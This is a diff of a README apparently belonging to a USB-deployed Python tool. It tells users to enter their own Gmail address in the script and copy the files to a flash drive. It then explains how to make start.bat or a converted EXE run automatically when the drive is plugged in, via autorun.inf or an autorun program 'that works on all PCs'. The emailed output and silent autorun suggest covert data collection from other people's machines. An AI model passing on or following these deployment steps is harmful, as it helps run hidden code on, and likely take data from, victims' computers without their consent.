@@ -27,7 +27,7 @@ Step 3: Replace The * Your Gmail Email Address Here * On Line 177.
 
 Step 4: Save The Python Script.
 
-Step 5:  Copy The Files To Your USB Flash Drive. And Make It Run The start.bat With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (VERY RECOMMENDED AND WORKS ON ALL PCS) To Make It Run The start.bat Or The Exe File That You Coverted (OPTIONAL) Automatically When Plugged In.
+Step 5:  Copy The Files To Your USB Flash Drive. And Make It Run The start.bat Automatically When Plugged In With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (VERY RECOMMENDED AND WORKS ON ALL PCS) To Make It Run The start.bat Or The Exe File That You Coverted ( STEP 5 [OPTINIAL] ) Automatically When Plugged In.
 
 Step 6, (RECOMMENDED BUT OPTIONAL): Convert The Python Script Into An EXE With Auto-Py-To-EXE And Delete The start.bat. Tutorial On How To Convert A Python Script Into EXE: https://www.youtube.com/watch?v=xJAM8_Lx5mY
 
